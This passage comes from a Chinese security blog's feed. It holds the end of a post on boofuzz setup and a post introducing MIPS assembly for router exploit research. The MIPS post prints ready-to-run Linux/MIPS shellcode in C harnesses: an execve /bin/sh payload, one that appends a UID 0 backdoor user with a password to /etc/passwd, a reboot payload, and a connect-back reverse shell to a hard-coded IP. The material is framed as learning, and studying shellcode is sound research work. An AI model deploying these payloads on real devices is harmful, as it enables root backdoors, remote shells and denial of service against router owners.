href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p><img alt="image-20200720143201264" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143201264.png" class="lozad"></p><p><img alt="image-20200724141742030" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724141742030.png" class="lozad"></p><h2 id="BOOFUZZ流程"><a href="#BOOFUZZ流程" class="headerlink" title="BOOFUZZ流程"></a>BOOFUZZ流程</h2><p><img alt="image-20200721101153708" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200721101153708.png" class="lozad"></p><p><img alt="image-20200720161547905" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720161547905.png" class="lozad"></p><p>0x01 Boofuzz虚拟环境创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-pip python3-venv build-essential</span><br><span class="line">$ mkdir boofuzz &amp;&amp; cd boofuzz</span><br><span class="line">$ python3 -m venv env</span><br><span class="line">$ source env/bin/activate</span><br></pre></td></tr></table></figure><p>0x02 Boofuzz安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(env) $ pip install boofuzz</span><br></pre></td></tr></table></figure><p>0x03 Boofuzz框架主要层</p><ul><li>数据生成：根据协议格式利用原语来构造请求</li><li>会话管理/驱动：将请求以图的形式链接起来形成会话，同时管理待测目标、代理、请求，还提供一个web界面用于监视和控制</li><li>代理：与目标进行交互以实现日志记录、对网络流量进行监控等<br>通常，代理是运行在目标设备上。但是，对于IoT设备而言，大部分情况下都无法在目标设备上运行代理程序。</li><li>实用工具：独立的命令行工具，完成一些其他的功能</li></ul><p>0x04 Boofuzz测试的主要步骤</p><ul><li>根据网络数据包构造请求</li><li>设置会话信息(包括测试目标的ip地址和端口等)，然后按照请求的先后顺序将其链接起来</li><li>添加对目标设备的监控和设备重启机制等</li><li>开始fuzz</li></ul><p>0x05 Boofuzz常用语法</p><ul><li>session():建立会话模块</li></ul><ul><li>s_initialize:初始化模块</li></ul><ul><li><p>call_back:回调函数</p><p>根据每个节点进行操作，定义回调函数以实现根据相应结果执行制</p></li></ul><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>后台 127.0.0.1:26000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boo open ./test.db</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>mips 汇编语言</title>
    <link href="https://nocbtm.github.io/2020/06/06/mips-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <id>https://nocbtm.github.io/2020/06/06/mips-汇编语言/</id>
    <published>2020-06-06T09:47:28.000Z</published>
    <updated>2020-06-11T00:55:46.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是<code>mips</code>架构的，像<code>TP-Link</code>的路由器；</p><p>还有<code>arm</code>架构的，像华为，小米的路由器。</p><p>根据之前学习<code>X86</code>下的汇编和做过<code>arm-pwn</code>的经验，其实很容易掌握<code>mips</code>汇编，更容易抓住重点。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.<code>MIPS</code>使用定长指令，所有指令都是32位长的<br>2.1字节=8位，半字长=2个字节（32位），1字长=4个字节<br>3.一个字符空间=1个字节<br>4.一个整形=一个字长=4个字节<br>5.单个字符用单引号<br>6.字符串用双引号</p><h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>一共有32个寄存器一般用助记符表示</p><ul><li>MIPS下一共有32个通用寄存器</li><li>在汇编中，寄存器标志以$开头</li><li>寄存器表示可以有两种方式：<br>1.直接使用该寄存器对应的编号，例如：从$0到$31<br>2.使用对应的寄存器名称，例如t1,t1,sp，详见下文</li><li>对于以上两者，不存在直接寻址，必须通过<code>mfhi(“move from hi”)</code>和<code>mflo(“move from lo”)</code>分别来进行访问对应的内容。</li><li>栈的走向是从高地址向低地址</li></ul><p><img alt="" data-src="https://nocbtm.github.io/imgs/mips-asm-1.png" class="lozad"></p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><p>指令的话没必要全部都看反正看了也记不住，留一个基本的指令集来查询吧 <a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p><p>值得注意的是 <code>MIPS</code>有三种指令格式，而且所有的指令都是32位长，这点跟<code>X86</code>的很不一样。</p><p>通过写 <code>shellcode</code>可以更好的掌握汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sh=<span class="string">'''</span></span><br><span class="line">li $v0,<span class="number">0x6e69622f</span></span><br><span class="line">sw $v0,<span class="number">0</span>($sp)</span><br><span class="line">li $v0,<span class="number">0x0068732f</span></span><br><span class="line">sw $v0,<span class="number">4</span>($sp)</span><br><span class="line">addiu $a0,$sp,<span class="number">0</span></span><br><span class="line">li $v0,<span class="number">4011</span></span><br><span class="line">li $a1,<span class="number">0</span></span><br><span class="line">li $a2,<span class="number">0</span></span><br><span class="line">syscall</span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - execve /bin/sh - 48 bytes</span></span><br><span class="line"><span class="comment">   Date:   2011-11-24</span></span><br><span class="line"><span class="comment">   Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">        .text</span></span><br><span class="line"><span class="comment">        .global __start</span></span><br><span class="line"><span class="comment">__start:</span></span><br><span class="line"><span class="comment">        slti $a2, $zero, -1</span></span><br><span class="line"><span class="comment">        li $t7, 0x2f2f6269</span></span><br><span class="line"><span class="comment">        sw $t7, -12($sp)</span></span><br><span class="line"><span class="comment">        li $t6, 0x6e2f7368</span></span><br><span class="line"><span class="comment">        sw $t6, -8($sp)</span></span><br><span class="line"><span class="comment">        sw $zero, -4($sp)</span></span><br><span class="line"><span class="comment">        la $a0, -12($sp)</span></span><br><span class="line"><span class="comment">        slti $a1, $zero, -1</span></span><br><span class="line"><span class="comment">        li $v0, 4011</span></span><br><span class="line"><span class="comment">        syscall 0x40404</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] = &#123;</span><br><span class="line">        <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">/* slti    a2,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">/* lui     t7,0x2f2f    */</span></span><br><span class="line">        <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">/* ori     t7,t7,0x6269 */</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">/* sw      t7,-12(sp)   */</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">/* lui     t6,0x6e2f    */</span></span><br><span class="line">        <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">/* ori     t6,t6,0x7368 */</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">/* sw      t6,-8(sp)    */</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">/* sw      zero,-4(sp)  */</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">/* addiu   a0,sp,-12    */</span></span><br><span class="line">        <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">/* slti    a1,zero,-1   */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">/* li      v0,4011      */</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">/* syscall 0x40404      */</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Title:  Linux/MIPS - add user(UID 0) with password - 164 bytes</span></span><br><span class="line"><span class="comment"> * Date:   2011-11-24</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [at] gmail.com</span></span><br><span class="line"><span class="comment"> * Note:</span></span><br><span class="line"><span class="comment"> *         Username - rOOt</span></span><br><span class="line"><span class="comment"> *         Password - pwn3d</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520</span></span><br><span class="line">        <span class="string">"\x05\x30\xff\xff"</span>       <span class="comment">//  bltzal  t1,400094 &lt;L&gt;</span></span><br><span class="line">        <span class="string">"\x24\x09\x73\x50"</span>       <span class="comment">//  li      t1,29520 (nop)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* open("/etc/passwd", O_WRONLY|O_CREAT|O_APPEND); */</span></span><br><span class="line">        <span class="string">"\x3c\x0f\x30\x2f"</span>       <span class="comment">//  lui     t7,0x302f</span></span><br><span class="line">        <span class="string">"\x35\xef\x65\x74"</span>       <span class="comment">//  ori     t7,t7,0x6574</span></span><br><span class="line">        <span class="string">"\x3c\x0e\x63\x2f"</span>       <span class="comment">//  lui     t6,0x632f   </span></span><br><span class="line">        <span class="string">"\x35\xce\x70\x61"</span>       <span class="comment">//  ori     t6,t6,0x7061</span></span><br><span class="line">        <span class="string">"\x3c\x0d\x73\x73"</span>       <span class="comment">//  lui     t5,0x7373</span></span><br><span class="line">        <span class="string">"\x35\xad\x77\x64"</span>       <span class="comment">//  ori     t5,t5,0x7764</span></span><br><span class="line">        <span class="string">"\xaf\xaf\xff\xf3"</span>       <span class="comment">//  sw      t7,-13(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xae\xff\xf7"</span>       <span class="comment">//  sw      t6,-9(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xad\xff\xfb"</span>       <span class="comment">//  sw      t5,-5(sp)</span></span><br><span class="line">        <span class="string">"\xaf\xa0\xff\xff"</span>       <span class="comment">//  sw      zero,-1(sp)</span></span><br><span class="line">        <span class="string">"\x27\xa4\xff\xf4"</span>       <span class="comment">//  addiu   a0,sp,-12</span></span><br><span class="line">        <span class="string">"\x24\x05\x01\x6d"</span>       <span class="comment">//  li      a1,365</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa5"</span>       <span class="comment">//  li      v0,4005</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">        <span class="string">"\xaf\xa2\xff\xfc"</span>       <span class="comment">//  sw      v0,-4(sp)</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* write(fd, "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n", 45); */</span></span><br><span class="line">        <span class="string">"\x8f\xa4\xff\xfc"</span>       <span class="comment">//  lw      a0,-4(sp)</span></span><br><span class="line">        <span class="string">"\x23\xe5\x10\x0c"</span>       <span class="comment">//  addi    a1,ra,4108</span></span><br><span class="line">        <span class="string">"\x20\xa5\xf0\x60"</span>       <span class="comment">//  addi    a1,a1,-4000</span></span><br><span class="line">        <span class="string">"\x24\x09\xff\xd3"</span>       <span class="comment">//  li      t1,-45</span></span><br><span class="line">        <span class="string">"\x01\x20\x30\x27"</span>       <span class="comment">//  nor     a2,t1,zero</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa4"</span>       <span class="comment">//  li      v0,4004</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line">        <span class="comment">/* close(fd); */</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa6"</span>       <span class="comment">//  li      v0,4006</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>       <span class="comment">//  syscall 0x40404</span></span><br><span class="line">     </span><br><span class="line">        <span class="comment">/* exit(0);  */</span></span><br><span class="line">        <span class="string">"\x28\x04\xff\xff"</span>        <span class="comment">//  slti    a0,zero,-1</span></span><br><span class="line">        <span class="string">"\x24\x02\x0f\xa1"</span>        <span class="comment">//  li      v0,4001</span></span><br><span class="line">        <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">//  syscall 0x40404</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">/*  "rOOt:XJ1GV.nyFFMoI:0:0:root:/root:/bin/bash\n" */</span></span><br><span class="line">        <span class="string">"\x72\x4f\x4f\x74"</span>       </span><br><span class="line">        <span class="string">"\x3a\x58\x4a\x31"</span>       </span><br><span class="line">        <span class="string">"\x47\x56\x2e\x6e"</span>       </span><br><span class="line">        <span class="string">"\x79\x46\x46\x4d"</span>       </span><br><span class="line">        <span class="string">"\x6f\x49\x3a\x30"</span>       </span><br><span class="line">        <span class="string">"\x3a\x30\x3a\x72"</span>       </span><br><span class="line">        <span class="string">"\x6f\x6f\x74\x3a"</span>       </span><br><span class="line">        <span class="string">"\x2f\x72\x6f\x6f"</span>      </span><br><span class="line">        <span class="string">"\x74\x3a\x2f\x62"</span>      </span><br><span class="line">        <span class="string">"\x69\x6e\x2f\x62"</span>       </span><br><span class="line">        <span class="string">"\x61\x73\x68\x0a"</span>;       </span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="built_in">strlen</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - reboot() - 32 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =          </span><br><span class="line">         <span class="string">"\x3c\x06\x43\x21"</span>       <span class="comment">// lui     a2,0x4321</span></span><br><span class="line">         <span class="string">"\x34\xc6\xfe\xdc"</span>       <span class="comment">// ori     a2,a2,0xfedc</span></span><br><span class="line">         <span class="string">"\x3c\x05\x28\x12"</span>       <span class="comment">// lui     a1,0x2812</span></span><br><span class="line">         <span class="string">"\x34\xa5\x19\x69"</span>       <span class="comment">// ori     a1,a1,0x1969</span></span><br><span class="line">         <span class="string">"\x3c\x04\xfe\xe1"</span>       <span class="comment">// lui     a0,0xfee1</span></span><br><span class="line">         <span class="string">"\x34\x84\xde\xad"</span>       <span class="comment">// ori     a0,a0,0xdead</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xf8"</span>       <span class="comment">// li      v0,4088</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;      <span class="comment">// syscall 0x40404 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Title: Linux/MIPS - connect back shellcode (port 0x7a69) - 168 bytes.</span></span><br><span class="line"><span class="comment"> * Author: rigan - imrigan [sobachka] gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] =</span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x20\x27"</span>        <span class="comment">// nor     a0,t7,zero</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x57"</span>        <span class="comment">// li      v0,4183 ( sys_socket )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\xaf\xa2\xff\xff"</span>        <span class="comment">// sw      v0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3 ( sa_family = AF_INET )</span></span><br><span class="line">         <span class="string">"\x01\xe0\x78\x27"</span>        <span class="comment">// nor     t7,t7,zero</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xe0"</span>        <span class="comment">// sw      t7,-32(sp) </span></span><br><span class="line">         <span class="string">"\x3c\x0e\x7a\x69"</span>        <span class="comment">// lui     t6,0x7a69 ( sin_port = 0x7a69 )</span></span><br><span class="line">         <span class="string">"\x35\xce\x7a\x69"</span>        <span class="comment">// ori     t6,t6,0x7a69</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xe4"</span>        <span class="comment">// sw      t6,-28(sp)</span></span><br><span class="line">         </span><br><span class="line">      <span class="comment">/* ====================  You can change ip here ;) ====================== */</span></span><br><span class="line">         <span class="string">"\x3c\x0d\xc0\xa8"</span>        <span class="comment">// lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... </span></span><br><span class="line">         <span class="string">"\x35\xad\x01\x64"</span>        <span class="comment">// ori     t5,t5,0x164           ...0164 )</span></span><br><span class="line">      <span class="comment">/* ====================================================================== */</span></span><br><span class="line">      </span><br><span class="line">         <span class="string">"\xaf\xad\xff\xe6"</span>        <span class="comment">// sw      t5,-26(sp)</span></span><br><span class="line">         <span class="string">"\x23\xa5\xff\xe2"</span>        <span class="comment">// addi    a1,sp,-30</span></span><br><span class="line">         <span class="string">"\x24\x0c\xff\xef"</span>        <span class="comment">// li      t4,-17 ( addrlen = 16 )     </span></span><br><span class="line">         <span class="string">"\x01\x80\x30\x27"</span>        <span class="comment">// nor     a2,t4,zero </span></span><br><span class="line">         <span class="string">"\x24\x02\x10\x4a"</span>        <span class="comment">// li      v0,4170 ( sys_connect ) </span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x24\x0f\xff\xfd"</span>        <span class="comment">// li      t7,-3</span></span><br><span class="line">         <span class="string">"\x01\xe0\x28\x27"</span>        <span class="comment">// nor     a1,t7,zero</span></span><br><span class="line">         <span class="string">"\x8f\xa4\xff\xff"</span>        <span class="comment">// lw      a0,-1(sp)</span></span><br><span class="line"><span class="comment">//dup2_loop:</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xdf"</span>        <span class="comment">// li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>        <span class="comment">// syscall 0x40404</span></span><br><span class="line">         <span class="string">"\x20\xa5\xff\xff"</span>        <span class="comment">// addi    a1,a1,-1</span></span><br><span class="line">         <span class="string">"\x24\x01\xff\xff"</span>        <span class="comment">// li      at,-1</span></span><br><span class="line">         <span class="string">"\x14\xa1\xff\xfb"</span>        <span class="comment">// bne     a1,at, dup2_loop</span></span><br><span class="line"> </span><br><span class="line">         <span class="string">"\x28\x06\xff\xff"</span>        <span class="comment">// slti    a2,zero,-1</span></span><br><span class="line">         <span class="string">"\x3c\x0f\x2f\x2f"</span>        <span class="comment">// lui     t7,0x2f2f</span></span><br><span class="line">         <span class="string">"\x35\xef\x62\x69"</span>        <span class="comment">// ori     t7,t7,0x6269</span></span><br><span class="line">         <span class="string">"\xaf\xaf\xff\xf4"</span>        <span class="comment">// sw      t7,-12(sp)</span></span><br><span class="line">         <span class="string">"\x3c\x0e\x6e\x2f"</span>        <span class="comment">// lui     t6,0x6e2f</span></span><br><span class="line">         <span class="string">"\x35\xce\x73\x68"</span>        <span class="comment">// ori     t6,t6,0x7368</span></span><br><span class="line">         <span class="string">"\xaf\xae\xff\xf8"</span>        <span class="comment">// sw      t6,-8(sp)</span></span><br><span class="line">         <span class="string">"\xaf\xa0\xff\xfc"</span>        <span class="comment">// sw      zero,-4(sp)</span></span><br><span class="line">         <span class="string">"\x27\xa4\xff\xf4"</span>        <span class="comment">// addiu   a0,sp,-12</span></span><br><span class="line">         <span class="string">"\x28\x05\xff\xff"</span>        <span class="comment">// slti    a1,zero,-1</span></span><br><span class="line">         <span class="string">"\x24\x02\x0f\xab"</span>        <span class="comment">// li      v0,4011 ( sys_execve )</span></span><br><span class="line">         <span class="string">"\x01\x01\x01\x0c"</span>;       <span class="comment">// syscall 0x40404</span></span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"size: %d\n"</span>, <span class="keyword">sizeof</span>(sc));</span><br><span class="line">       s = sc;</span><br><span class="line">       s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reference：</p><p><a href="http://edu.i-soft.com.cn/doc/longxin-2017/02-1MIPS指令与汇编.pdf" target="_blank" rel="noopener">MIPS指令与汇编.pdf</a></p><p><a href="https://blog.csdn.net/u012837895/article/details/79855896" target="_blank" rel="noopener">MIPS汇编快速入门</a></p><p><a href="https://n132.github.io/2020/04/10/mips-Assembly-Language/" target="_blank" rel="noopener">mips_Assembly_Language</a></p><p><a href="https://blog.csdn.net/yixilee/article/details/4316617" target="_blank" rel="noopener">MIPS指令集</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近要着手去做一些路由器的漏洞复现，了解到路由器大多都是&lt;code&gt;mips&lt;/code&gt;架构的，像&lt;code&gt;TP-Link&lt;/code&gt;
      
    
    </summary>
    
      <category term="mips" scheme="https://nocbtm.github.io/categories/mips/"/>
    
    
      <category term="mips" scheme="https://nocbtm.github.io/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF pwn writeup</title>
